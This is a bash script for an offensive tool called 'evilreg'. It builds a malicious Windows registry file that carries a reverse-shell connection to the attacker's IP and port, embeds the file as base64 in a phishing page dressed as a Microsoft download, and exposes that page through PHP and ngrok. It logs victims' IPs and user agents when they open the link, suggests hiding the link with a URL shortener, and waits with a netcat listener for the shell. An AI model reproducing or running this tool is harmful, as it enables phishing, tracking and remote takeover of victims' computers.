#!/bin/bash
# evilreg v1.0.1
# coded by: @linux_choice (twitter)
# github.com/thelinuxchoice/evilreg
# If you use any part from this code, giving me the credits. Read the License!

trap 'printf "\n";stop' 2
server_tcp="3.17.202.129" #NGROK IP

banner() {

printf "\e[1;91m___________     .__.__                         \n"
printf "\e[1;91m\_   _____/__  _|__|  |\e[93m_______   ____   ____  \e[0m \n"
printf "\e[1;91m |    __)_\_ \/ /  |  |\e[93m\_  __ \_/ __ \ / ___\ \e[0m \n"
printf "\e[1;91m |        \ /  /|  |  |\e[93m_|  | \/\  ___// /_/  > \e[0m\n"
printf "\e[1;91m/_______  / \_/ |__|____/\e[93m__|    \___  >___  /  \e[0m\n"
printf "\e[1;91m        \/               \e[93m           \/_____/    \e[0m\n"

printf " \e[1;77mv1.0.1 coded by @linux_choice\n"
printf " \e[1;77mgithub.com/thelinuxchoice/evilreg\e[0m\n"
printf "\n"

}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {

command -v base64 > /dev/null 2>&1 || { echo >&2 "I require base64 but it's not installed. Install it. Aborting."; exit 1; }
#command -v zip > /dev/null 2>&1 || { echo >&2 "I require MSFVenom but it's not installed. Install it. Aborting."; exit 1; }
command -v netcat > /dev/null 2>&1 || { echo >&2 "I require netcat but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
#command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 

}

direct_link() {
if [[ ! -e sendlink ]]; then
printf "Error!\n"
exit 1
else

send_link=$(grep -o "https://[^ ]*." sendlink)
if [[ ! -z "$send_link" ]]; then

printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Obfuscation URL use bitly.com (insert above link without https)\e[0m\n'

else
printf "Error!"
exit 1
fi

fi

}

ngrok_server() {

if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server (port 3333)...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2

if [[ -e check_ngrok ]]; then
rm -rf ngrok_check
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\e[0m\n"
./ngrok tcp 4444 > /dev/null 2>&1 > check_ngrok &
sleep 10

check_ngrok=$(grep -o 'ERR_NGROK_302' check_ngrok)

if [[ ! -z $check_ngrok ]];then
printf "\n\e[91mAuthtoken missing!\e[0m\n"
printf "\e[77mSign up at: https://ngrok.com/signup\e[0m\n"
printf "\e[77mYour authtoken is available on your dashboard: https://dashboard.ngrok.com\n\e[0m"
printf "\e[77mInstall your auhtoken:\e[0m\e[93m ./ngrok authtoken <YOUR_AUTHTOKEN>\e[0m\n\n"
rm -rf check_ngrok
exit 1
fi

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*")

if [[ ! -z $link ]]; then 
printf "\e[1;92m[\e[0m*\e[1;92m] Forwarding from:\e[0m\e[1;77m %s\e[0m\n" $link
else
printf "\n\e[91mNgrok Error!\e[0m\n"
exit 1
fi

}

settings() {

default_choose_sub="Y"
default_subdomain="microsoft"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

}

settings2() {

default_payload_name="evilreg"
default_url="https://www.microsoft.com/en-us/download/details.aspx?id=9905"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_payload_name

read payload_name
payload_name="${payload_name:-${default_payload_name}}"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Redirect URL (Default:\e[0m\e[1;77m %s\e[0m\e[1;33m): \e[0m' $default_url
read url
url="${url:-${default_url}}"

}

start() {

if [[ -e ip.txt ]]; then
rm -f ip.txt
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok.io:\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom (localhost/WAN):\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a reverse TCP Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
forward=true
#settings
settings2
ngrok_server
#server
payload
#direct_link
listener
elif [[ $option_server -eq 2 ]]; then
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] IP (localhost/WAN): \e[0m' custom_ip
if [[ -z "$custom_ip" ]]; then
exit 1
fi
server_tcp=$custom_ip
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] TCP Port (localhost/WAN): \e[0m' custom_port
if [[ -z "$custom_port" ]]; then
exit 1
fi
server_port=$custom_port
settings2
payload
listener
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start
fi

}

server() {

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting localhost.run server...\e[0m\n"

if [[ $subdomain_resp == true ]]; then

ssh -T -tt -o StrictHostKeyChecking=no -R 80:localhost:3333 "$subdomain"@ssh.localhost.run > sendlink &
sleep 4
else
$(which sh) -c 'ssh -t -t -o StrictHostKeyChecking=no  -R 80:localhost:3333 ssh.localhost.run 2> /dev/null > sendlink ' &
sleep 4
fi

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device=$(grep -o 'User-Agent:.*' ip.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $device
cat ip.txt >> saved.ip.txt
rm -rf ip.txt
}

listener() {

if [[ $forward == true ]];then
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[1;91m Expose the server with command: \e[0m\n"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[93m ssh -R 80:localhost:3333 custom-subdomain@ssh.localhost.run \e[0m\n"
#printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[92m Send the HTTP link instead HTTPS to automatically download reg file \e[0m\n"

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[1;91m Target must reboot/logout after installing reg file\e[0m\e[1;77m\n"
checkfound
else
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[1;91m Target must reboot/logout after installing reg file\e[0m\e[1;77m\n"
default_start_listener="Y"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m'
read start_listener
start_listener="${start_listener:-${default_start_listener}}"
if [[ $start_listener == "Y" || $start_listener == "y" || $start_listener == "Yes" || $start_listener == "yes" ]]; then
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Listening connection, port 4444:\e[0m\n"
nc -lvp 4444
else
exit 1
fi
fi
}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do

if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip

default_start_listener="Y"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m'
read start_listener
start_listener="${start_listener:-${default_start_listener}}"
if [[ $start_listener == "Y" || $start_listener == "y" || $start_listener == "Yes" || $start_listener == "yes" ]]; then
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Listening connection, port 4444:\e[0m\n"
nc -lvp 4444

fi
fi
done
sleep 0.5

}

payload() {
if [[ $forward == true ]];then
server_port=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*" | cut -d ':' -f3)
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building reg file\e[0m\n"

sed 's+server_ip+'$server_tcp'+g' temp.reg | sed 's+server_port+'$server_port'+g' > $payload_name.reg

if [[ -e $payload_name.reg ]]; then

#zip $payload_name.zip $payload_name.reg > /dev/null 2>&1
IFS=$'\n'
#data_base64=$(base64 -w 0 $payload_name.zip)
#temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"
data_base64_2=$(base64 -w 0 $payload_name.reg)
temp64_2="$( echo "${data_base64_2}" | sed 's/[\\&*./+!]/\\&/g' )"

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Converting reg file to base64\e[0m\n" 
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Injecting Data URI code into index.html\e[0m\n"
sed 's+url_website+'$url'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64_2}'+g ' > index.php
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Reg file saved: %s.reg\e[0m\n" $payload_name

else
printf "\e[1;93mError\e[0m\n"
fi

}

banner
dependencies
start

